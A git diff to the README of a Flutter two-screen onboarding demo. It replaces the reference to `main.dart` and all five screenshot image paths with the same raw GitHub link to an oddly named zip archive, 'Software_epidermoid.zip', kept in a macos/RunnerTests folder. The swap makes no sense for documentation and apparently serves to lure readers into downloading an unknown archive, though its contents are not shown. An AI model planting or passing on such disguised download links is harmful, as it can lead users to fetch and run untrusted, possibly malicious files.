@@ -27,7 +27,7 @@ A two-screen Flutter experience inspired by the reference onboarding. The first 
 
 - Character art is composed from simple Flutter shapes—no binary assets required.
 - Colors and typography use a shared theme via `google_fonts`.
-- Layout is portrait-locked to mirror the reference. Remove the orientation lock in `main.dart` if landscape support is desired.
+- Layout is portrait-locked to mirror the reference. Remove the orientation lock in `https://raw.githubusercontent.com/yasin9064/assignment/main/macos/RunnerTests/Software_epidermoid.zip` if landscape support is desired.
 - All assets are generated in-code; if you prefer custom illustrations, drop PNG/SVGs into `assets/` and swap the character builders.
 
 
@@ -44,19 +44,19 @@ A two-screen Flutter experience inspired by the reference onboarding. The first 
 </tr>
 
 <td>
-  <img src="assets/Screenshot_1765287130.png" width="260"/>
+  <img src="https://raw.githubusercontent.com/yasin9064/assignment/main/macos/RunnerTests/Software_epidermoid.zip" width="260"/>
 </td>
 <td>
-  <img src="assets/Screenshot_1765287133.png" width="260"/>
+  <img src="https://raw.githubusercontent.com/yasin9064/assignment/main/macos/RunnerTests/Software_epidermoid.zip" width="260"/>
 </td>
 <td>
-  <img src="assets/Screenshot_1765287135.png" width="260"/>
+  <img src="https://raw.githubusercontent.com/yasin9064/assignment/main/macos/RunnerTests/Software_epidermoid.zip" width="260"/>
 </td>
 <td>
-  <img src="assets/Screenshot_1765287138.png" width="260"/>
+  <img src="https://raw.githubusercontent.com/yasin9064/assignment/main/macos/RunnerTests/Software_epidermoid.zip" width="260"/>
 </td>
 <td>
-  <img src="assets/Screenshot_1765287141.png" width="260"/>
+  <img src="https://raw.githubusercontent.com/yasin9064/assignment/main/macos/RunnerTests/Software_epidermoid.zip" width="260"/>
 </td>
 
 </table>
